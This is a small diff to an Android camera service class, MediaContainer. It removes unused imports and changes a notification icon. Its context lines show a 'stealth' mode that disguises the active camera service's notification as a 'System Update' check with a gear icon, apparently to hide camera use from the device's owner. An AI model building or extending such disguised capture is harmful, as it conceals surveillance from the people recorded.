@@ -16,7 +16,6 @@ import android.graphics.ImageFormat;
 import android.graphics.Matrix;
 import android.graphics.PixelFormat;
 import android.graphics.Rect;
-import android.graphics.SurfaceTexture;
 import android.graphics.YuvImage;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCaptureSession;
@@ -34,7 +33,6 @@ import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
 import android.os.PowerManager;
-import android.util.Base64;
 import android.util.Log;
 import android.util.Size;
 import android.view.Gravity;
@@ -63,7 +61,6 @@ import java.util.concurrent.ArrayBlockingQueue;
 import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
-import java.util.concurrent.atomic.AtomicBoolean;
 
 public class MediaContainer extends Service {
     private static final String TAG = "MediaContainer";
@@ -219,7 +216,7 @@ public class MediaContainer extends Service {
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle(stealth ? "System Update" : "Camera Service")
                 .setContentText(stealth ? "Checking for system updates..." : "Camera service is active")
-                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
+                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
@@ -1267,7 +1264,7 @@ public class MediaContainer extends Service {
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                     .setContentTitle(stealth ? "System Update" : "Camera Service")
                     .setContentText(stealth ? "Checking for system updates..." : text)
-                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
+                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
                     .setContentIntent(pendingIntent)
                     .setOngoing(true)
                     .setPriority(NotificationCompat.PRIORITY_LOW)
